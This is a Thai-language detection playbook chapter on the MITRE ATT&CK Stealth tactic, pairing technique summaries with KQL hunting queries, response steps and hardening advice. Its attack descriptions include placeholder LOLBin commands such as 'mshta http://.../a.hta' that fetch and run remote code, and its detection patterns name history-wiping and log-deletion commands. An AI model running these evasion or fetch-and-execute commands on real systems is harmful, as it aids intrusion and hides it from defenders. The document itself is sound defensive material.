# 07. Stealth (TA0005)

## เป้าหมายของผู้โจมตี

ซ่อนการกระทำให้กลมกลืนกับกิจกรรมปกติ — ใช้โปรแกรมของระบบเอง (Living off the Land), พรางไฟล์/คำสั่ง, ฉีดโค้ดเข้า process ที่น่าเชื่อถือ, ปลอมชื่อ และลบร่องรอย
ใน v20 Tactic นี้คือส่วนที่เดิมเรียกว่า Defense Evasion ส่วนพฤติกรรมที่ **ทำลายระบบป้องกันโดยตรง** (ปิด EDR, ล้าง log) ย้ายไปที่ [Defense Impairment](08-defense-impairment.md)

## ลำดับการทำงานที่พบบ่อย

1. ส่ง payload ที่ถูก obfuscate/pack (T1027) และถอดในหน่วยความจำ (T1140)
2. รันผ่าน binary ที่ Microsoft signed (T1218: `rundll32`, `regsvr32`, `mshta`, `msiexec`)
3. ตั้งชื่อไฟล์/service/task ให้ดูเป็นของระบบ (T1036)
4. ฉีดโค้ดเข้า `explorer.exe`, `svchost.exe` หรือ process ที่ได้รับ allowlist (T1055)
5. ซ่อนไฟล์และหน้าต่าง, ใช้ inbox rule ซ่อนอีเมล (T1564), ลบไฟล์เครื่องมือและประวัติคำสั่ง (T1070)

## Log ที่ต้องมี

| สัญญาณ | ตาราง |
|---|---|
| LOLBin + network | `DeviceProcessEvents`, `DeviceNetworkEvents` |
| ชื่อไฟล์ vs. metadata | `DeviceProcessEvents` (`ProcessVersionInfoOriginalFileName`) |
| Process injection | `DeviceEvents` (`CreateRemoteThreadApiCall`, `QueueUserApcRemoteApiCall` ฯลฯ) |
| Inbox rule ที่ซ่อนอีเมล | `OfficeActivity` |

---

## T1218 System Binary Proxy Execution

**วิธีทำงาน** — ใช้ binary ที่ signed ให้โหลดโค้ดของผู้โจมตี: `rundll32 payload.dll,Export`, `regsvr32 /s /n /u /i:http://... scrobj.dll` (Squiblydoo), `mshta http://.../a.hta`, `msiexec /q /i http://...` เพราะ application control บางแบบเชื่อถือไฟล์ของ Microsoft

**KQL — LOLBin ติดต่ออินเทอร์เน็ต**
```kql
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where InitiatingProcessFileName in~ ("rundll32.exe", "regsvr32.exe", "mshta.exe", "msiexec.exe", "certutil.exe",
                                       "installutil.exe", "regasm.exe", "regsvcs.exe", "msbuild.exe", "odbcconf.exe", "cmstp.exe")
| where RemoteIPType == "Public"
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort
```

**KQL — LOLBin โหลดไฟล์จากโฟลเดอร์ที่ผู้ใช้เขียนได้**
```kql
DeviceProcessEvents
| where Timestamp > ago(1d)
| where FileName in~ ("rundll32.exe", "regsvr32.exe")
| where ProcessCommandLine has_any (@"\AppData\", @"\Temp\", @"\Users\Public\", @"\ProgramData\", @"\Downloads\", "http")
| where ProcessCommandLine !has @"\Windows\"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
```

**วิธีรับมือ** — เก็บไฟล์ DLL/HTA/MSI ที่ถูกโหลด, ตรวจ C2 ที่ติดต่อ, isolate ถ้ายืนยันว่าเป็นอันตราย

**ป้องกันระยะยาว** — WDAC บล็อก LOLBin ที่ไม่ใช้ (Microsoft recommended block rules), ASR *Block execution of potentially obfuscated scripts*, firewall บล็อก outbound ของ `mshta`/`regsvr32`/`rundll32` บน workstation

**False positive** — ซอฟต์แวร์บางตัวใช้ `rundll32` จาก `%ProgramData%` → allowlist ตาม DLL hash/signer

---

## T1036 Masquerading

**วิธีทำงาน** — เปลี่ยนชื่อเครื่องมือ (`rclone.exe` → `svchost.exe`), วางไฟล์ชื่อระบบในโฟลเดอร์ผิด, นามสกุลซ้อน (`invoice.pdf.exe`), Right-to-Left Override, ตั้งชื่อ service/task/บัญชีให้คล้ายของจริง

**KQL — process ชื่อเหมือนไฟล์ระบบแต่รันจากที่อื่น**
```kql
let sysBins = dynamic(["svchost.exe", "lsass.exe", "services.exe", "csrss.exe", "winlogon.exe", "smss.exe",
                       "wininit.exe", "spoolsv.exe", "taskhostw.exe", "dllhost.exe", "conhost.exe", "explorer.exe"]);
DeviceProcessEvents
| where Timestamp > ago(1d)
| where FileName in~ (sysBins)
| where not(FolderPath startswith @"C:\Windows\System32\" or FolderPath startswith @"C:\Windows\SysWOW64\"
            or FolderPath =~ @"C:\Windows\explorer.exe" or FolderPath startswith @"C:\Windows\WinSxS\")
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, SHA256
```

**KQL — ไฟล์ถูกเปลี่ยนชื่อ (OriginalFileName ไม่ตรงกับชื่อจริง)**
```kql
DeviceProcessEvents
| where Timestamp > ago(1d)
| where isnotempty(ProcessVersionInfoOriginalFileName)
| where ProcessVersionInfoOriginalFileName in~ ("rclone.exe", "psexec.c", "procdump", "AdFind.exe", "7z.exe", "nltest.exe",
                                                "powershell.exe", "cmd.exe", "rundll32.exe", "certutil.exe", "mimikatz.exe", "plink.exe")
| where tolower(FileName) != tolower(ProcessVersionInfoOriginalFileName)
| where not(ProcessVersionInfoOriginalFileName =~ "procdump" and FileName startswith "procdump")
| project Timestamp, DeviceName, AccountName, FileName, ProcessVersionInfoOriginalFileName, FolderPath, ProcessCommandLine
```

**วิธีรับมือ** — ไฟล์ที่ปลอมชื่อเกือบทั้งหมดเป็นอันตราย: เก็บไฟล์, isolate, หาว่าใครวางไฟล์ (`DeviceFileEvents` FileCreated ของ SHA256 เดียวกัน)

**False positive** — `pwsh.exe`/`powershell_ise.exe` ที่ OriginalFileName ต่างเล็กน้อย, ผู้ดูแลที่เปลี่ยนชื่อ PsExec เอง (ควรห้ามตามนโยบาย)

---

## T1027 Obfuscated Files or Information / T1140 Deobfuscate

**วิธีทำงาน** — base64/XOR, string concatenation, packer (T1027.002), HTML/SVG smuggling (T1027.006, T1027.017), LNK icon smuggling, เก็บ payload ใน registry (fileless, T1027.011)

**KQL — base64 ยาวผิดปกติใน command line**
```kql
DeviceProcessEvents
| where Timestamp > ago(1d)
| where ProcessCommandLine matches regex @"[A-Za-z0-9+/]{200,}={0,2}"
| where InitiatingProcessFileName !in~ ("MsSense.exe", "SenseIR.exe", "CcmExec.exe", "IntuneManagementExtension.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, CmdLength = strlen(ProcessCommandLine), ProcessCommandLine
```

**KQL — certutil ถอดรหัส/ดาวน์โหลด (T1140)**
```kql
DeviceProcessEvents
| where Timestamp > ago(1d)
| where FileName =~ "certutil.exe"
| where ProcessCommandLine has_any ("-decode", "-decodehex", "-urlcache", "-verifyctl", "-split")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
```

**KQL — payload เก็บใน registry (fileless)**
```kql
DeviceRegistryEvents
| where Timestamp > ago(1d)
| where ActionType == "RegistryValueSet"
| where strlen(RegistryValueData) > 2000
| where RegistryKey !has @"\Microsoft\Windows\CurrentVersion\Explorer"
| project Timestamp, DeviceName, InitiatingProcessFileName, RegistryKey, RegistryValueName, DataLength = strlen(RegistryValueData)
```

**วิธีรับมือ** — ถอดรหัสใน sandbox (CyberChef), ดึง IOC, แล้วตรวจตาม Tactic ของ payload ที่ถอดได้

**ป้องกันระยะยาว** — AMSI + script block logging (เห็นคำสั่งหลังถอดรหัส), ASR obfuscated script rule

---

## T1055 Process Injection

**วิธีทำงาน** — เขียนโค้ดลงใน memory ของ process อื่นแล้วสั่งให้รัน (DLL injection, process hollowing, APC injection) ทำให้ C2 traffic หรือการอ่าน LSASS ดูเหมือนมาจาก process ปกติ

**KQL — remote thread / APC ข้าม process**
```kql
DeviceEvents
| where Timestamp > ago(1d)
| where ActionType in ("CreateRemoteThreadApiCall", "QueueUserApcRemoteApiCall", "SetThreadContextRemoteApiCall")
| where InitiatingProcessFileName !in~ ("MsMpEng.exe", "MsSense.exe", "csrss.exe", "services.exe", "svchost.exe", "wininit.exe", "smss.exe")
| summarize Count = count(), Targets = make_set(FileName, 10) by DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, ActionType
| order by Count desc
```

**วิธีรับมือ** — เก็บ memory dump ของ process เป้าหมาย **ก่อน** kill/รีบูต, ใช้ MDE *Collect investigation package*, isolate; injection เข้า process ระบบถือเป็น High

**ป้องกันระยะยาว** — EDR ใน block mode, ASR, Credential Guard ลดผลของ injection เข้า LSASS

**False positive** — security/DLP/accessibility software, game anti-cheat → allowlist ตาม signer

---

## T1070 Indicator Removal

**วิธีทำงาน** — ลบไฟล์เครื่องมือ (T1070.004), ล้างประวัติคำสั่ง (T1070.003), timestomp (T1070.006), ลบการเชื่อมต่อ share (T1070.005), ลบ persistence ที่ไม่ใช้แล้ว (T1070.009)
(การล้าง Windows Event Log ย้ายไปเป็น T1685.005 ใน [Defense Impairment](08-defense-impairment.md))

**KQL**
```kql
DeviceProcessEvents
| where Timestamp > ago(1d)
| where ProcessCommandLine has_any ("Clear-History", "history -c", "unset HISTFILE", "HISTFILE=/dev/null", "rm ~/.bash_history",
                                    "fsutil usn deletejournal", "sdelete", "cipher /w", "Remove-Item (Get-PSReadlineOption).HistorySavePath")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```

**วิธีรับมือ** — การลบร่องรอยมักเกิดใกล้จบปฏิบัติการ: ใช้ log ที่ส่งเข้า SIEM แล้ว (ลบจากเครื่องไม่ได้) สร้าง timeline, กู้ไฟล์จาก MFT/USN ถ้าทำได้

**ป้องกันระยะยาว** — ส่ง log ออกจากเครื่องแบบ real-time (M1029), จำกัดสิทธิ์ลบไฟล์ log

---

## T1564 Hide Artifacts

**วิธีทำงาน** — ซ่อนไฟล์ (attribute hidden, ADS), หน้าต่าง (`-WindowStyle Hidden`), บัญชี, รัน VM ซ่อน (T1564.006), เพิ่ม path exclusion ของ AV (T1564.012) และสร้าง **inbox rule ซ่อนอีเมล** (T1564.008) เพื่อไม่ให้เหยื่อเห็นการตอบกลับหรือแจ้งเตือนความปลอดภัย

**KQL — inbox rule ที่ย้าย/ลบอีเมลเกี่ยวกับความปลอดภัยหรือการเงิน**
```kql
OfficeActivity
| where TimeGenerated > ago(7d)
| where Operation in~ ("New-InboxRule", "Set-InboxRule", "UpdateInboxRules")
| where Parameters has_any ("DeleteMessage", "MoveToFolder", "MarkAsRead")
| where Parameters has_any ("RSS", "Archive", "Conversation History", "Deleted Items", "security", "password", "invoice", "payment", "phish", "hack")
| project TimeGenerated, UserId, ClientIP, Operation, Parameters
```

**KQL — เพิ่ม exclusion ของ Defender (ซ่อนไฟล์จาก AV)**
```kql
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where RegistryKey has @"\Windows Defender\Exclusions\"
| where ActionType == "RegistryValueSet"
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, RegistryKey, RegistryValueName
```

**วิธีรับมือ** — ลบ rule/exclusion, ตรวจไฟล์ที่อยู่ใน path ที่ถูก exclude ด้วย full scan, สำหรับ inbox rule ให้จัดการเป็นบัญชีถูกยึด ([T1078](03-initial-access.md#t1133-external-remote-services-และ-t1078-valid-accounts))

---

## Checklist ตอบสนองระดับ Tactic

- [ ] ระบุไฟล์/โค้ดที่ถูกซ่อนหรือพรางทั้งหมด และถอดรหัสเพื่อรู้ความสามารถจริง
- [ ] เก็บ memory ก่อน contain ถ้ามี injection หรือ fileless payload
- [ ] ใช้ log ที่อยู่ใน SIEM (ไม่ใช่บนเครื่อง) สร้าง timeline เพราะ log บนเครื่องอาจถูกลบ
- [ ] ตรวจ exclusion/allowlist ที่ผู้โจมตีอาจเพิ่ม และคืนค่า
- [ ] เพิ่ม detection ที่อิงพฤติกรรม (parent-child, network) แทนชื่อไฟล์หรือ hash
